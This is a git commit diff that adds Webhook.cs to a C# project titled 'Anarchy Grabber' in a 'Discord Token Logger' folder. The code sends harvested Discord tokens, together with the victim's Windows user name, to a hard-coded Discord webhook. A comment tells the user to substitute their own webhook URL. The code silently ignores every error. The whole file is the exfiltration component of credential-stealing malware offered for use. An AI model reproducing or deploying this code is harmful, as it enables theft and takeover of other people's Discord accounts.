fb1c2311f4577ea756dcf1f6c828ad76ced24e72
Vtheorem <74677647+Vtheorem@users.noreply.github.com>
2020-11-27 23:15:35 -0500

    Add files via upload

---
+++ Discord Token Logger/Anarchy Grabber/AnarchyGrabber/AnarchyGrabber/Webhook.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net.Http;
+
+namespace AnarchyGrabber
+{
+    public static class Webhook
+    {
+        //you've got to change this to your own discord webhook url
+        private static readonly string _hookUrl = "https://discord.com/api/webhooks/773672703046582273/WmqOzWVO6Szis-SvQzaQ_s8sXaQqTL7EA3vQMMWrkwrJ0PTtkvfCOmQYtQjmpwTHiU_D";
+
+
+        public static void ReportTokens(List<string> tokenReport)
+        {
+            try
+            {
+                HttpClient client = new HttpClient();
+                Dictionary<string, string> contents = new Dictionary<string, string>
+                    {
+                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "username", "Anarchy Token Grabber" },
+                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
+                    };
+
+                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+            }
+            catch { }
+        }
+    }
+}
